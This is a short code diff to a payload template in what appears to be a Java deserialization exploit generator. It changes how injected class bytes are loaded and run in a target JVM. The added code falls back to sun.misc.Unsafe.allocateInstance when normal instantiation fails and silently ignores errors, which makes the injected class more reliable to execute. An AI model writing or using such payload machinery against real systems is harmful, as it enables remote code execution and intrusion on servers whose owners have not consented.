@@ -2,6 +2,7 @@ package org.su18.ysuserial.payloads.templates;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
 import java.util.zip.GZIPInputStream;
@@ -30,7 +31,15 @@ public class ClassLoaderTemplate {
 			Method      method      = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
 			method.setAccessible(true);
 			Class invoke = (Class) method.invoke(null, classLoader, className, bytes, 0, bytes.length);
-			invoke.newInstance();
+			try {
+				invoke.newInstance();
+			} catch (Exception ignored) {
+				Class unsafe         = Class.forName("sun.misc.Unsafe");
+				Field theUnsafeField = unsafe.getDeclaredField("theUnsafe");
+				theUnsafeField.setAccessible(true);
+				Object unsafeObject = theUnsafeField.get(null);
+				unsafeObject.getClass().getDeclaredMethod("allocateInstance", Class.class).invoke(unsafeObject, invoke);
+			}
 		} catch (Exception ignored) {
 		}
 	}
